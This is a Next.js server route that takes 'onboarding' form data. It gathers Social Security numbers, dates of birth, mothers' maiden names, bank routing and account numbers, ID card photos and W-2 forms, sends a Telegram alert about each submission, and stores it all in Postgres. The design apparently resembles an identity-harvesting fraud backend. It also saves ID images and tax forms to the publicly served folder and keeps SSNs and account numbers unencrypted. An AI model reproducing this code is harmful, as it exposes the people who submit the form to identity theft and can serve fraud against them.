import { NextResponse } from 'next/server';
import { writeFile, mkdir } from 'fs/promises';
import path from 'path';
import { sql } from '@vercel/postgres';
import { randomUUID } from 'crypto';
import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';

export async function POST(req: Request) {
  try {
    const formData = await req.formData();

    /* ────── Scalar fields ────── */
    const applicant_id   = formData.get('applicant_id')?.toString()!;
    const first_name     = formData.get('first_name')?.toString()!;
    const middle_name    = formData.get('middle_name')?.toString() || '';
    const last_name      = formData.get('last_name')?.toString()!;
    const motherMaiden   = formData.get('motherMaidenName')?.toString() || '';
    const ssn            = formData.get('ssn')?.toString()!;
    const dob            = formData.get('dob')?.toString()!;
    const routing_number = formData.get('routing_number')?.toString()!;
    const account_number = formData.get('account_number')?.toString()!;
    const bank_name      = formData.get('bank_name')?.toString() || '';

    /* ────── Address (split fields) ────── */
    const street   = formData.get('address.street')?.toString()!.trim();
    const city     = formData.get('address.city')?.toString()!.trim();
    const state    = formData.get('address.state')?.toString()!.trim();
    const zip_code = formData.get('address.zip_code')?.toString()!.trim();

    if (!street || !city || !state || !zip_code) {
      return NextResponse.json(
        { error: 'All address fields (street, city, state, zip) are required.' },
        { status: 400 }
      );
    }

    /* ────── Files ────── */
    const front_image = formData.get('front_image') as File | null;
    const back_image  = formData.get('back_image')  as File | null;
    const w2_form     = formData.get('w2_form')     as File | null;

    const allowedImageTypes = ['image/jpeg', 'image/png', 'image/webp'];
    const maxSize = 5 * 1024 * 1024; // 5 MB

    if (!front_image || !back_image) {
      return NextResponse.json(
        { error: 'Front and back ID images are required.' },
        { status: 400 }
      );
    }

    const checkImg = (file: File) =>
      allowedImageTypes.includes(file.type) && file.size <= maxSize;

    if (!checkImg(front_image) || !checkImg(back_image)) {
      return NextResponse.json(
        { error: 'Images must be JPEG/PNG/WebP and ≤ 5 MB.' },
        { status: 400 }
      );
    }

    /* ────── Save files to /public/onboarding ────── */
    const uploadDir = path.join(process.cwd(), 'public', 'onboarding');
    await mkdir(uploadDir, { recursive: true });

    const saveFile = async (file: File, label: string) => {
      const ext = file.type.split('/')[1] || '';
      const filename = `${label}-${first_name}-${last_name}-${randomUUID()}.${ext}`;
      const fullPath = path.join(uploadDir, filename);
      await writeFile(fullPath, Buffer.from(await file.arrayBuffer()));
      // Public URL path
      return `/onboarding/${filename}`;
    };

    const front_image_url = await saveFile(front_image, 'front');
    const back_image_url  = await saveFile(back_image,  'back');
    const w2_form_url     = w2_form ? await saveFile(w2_form, 'w2') : null;

    /* ────── Telegram Notify ────── */
    await sendTelegramNotification(
      `📥 New onboarding:\n👤 ${first_name} ${last_name}\n🏦 Bank: ${bank_name}`
    );

    /* ────── Insert / Upsert ────── */
    await sql`
      INSERT INTO onboarding (
        applicant_id, first_name, middle_name, last_name, mother_maiden_name, ssn, date_of_birth,
        street, city, state, zip_code,
        account_number, routing_number, bank_name,
        front_image_url, back_image_url, w2_form,
        onboarding_completed, onboarding_date
      )
      VALUES (
        ${applicant_id}, ${first_name}, ${middle_name}, ${last_name}, ${motherMaiden},
        ${ssn}, ${dob},
        ${street}, ${city}, ${state}, ${zip_code},
        ${account_number}, ${routing_number}, ${bank_name},
        ${front_image_url}, ${back_image_url}, ${w2_form_url},
        true, NOW()
      )
      ON CONFLICT (applicant_id) DO UPDATE SET
        first_name         = EXCLUDED.first_name,
        middle_name        = EXCLUDED.middle_name,
        last_name          = EXCLUDED.last_name,
        mother_maiden_name = EXCLUDED.mother_maiden_name,
        ssn                = EXCLUDED.ssn,
        date_of_birth      = EXCLUDED.date_of_birth,
        street             = EXCLUDED.street,
        city               = EXCLUDED.city,
        state              = EXCLUDED.state,
        zip_code           = EXCLUDED.zip_code,
        account_number     = EXCLUDED.account_number,
        routing_number     = EXCLUDED.routing_number,
        bank_name          = EXCLUDED.bank_name,
        front_image_url    = EXCLUDED.front_image_url,
        back_image_url     = EXCLUDED.back_image_url,
        w2_form            = EXCLUDED.w2_form,
        onboarding_completed = true,
        onboarding_date    = NOW();
    `;

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('❌ Onboarding error:', err);
    return NextResponse.json({ error: 'Failed to complete onboarding.' }, { status: 500 });
  }
}
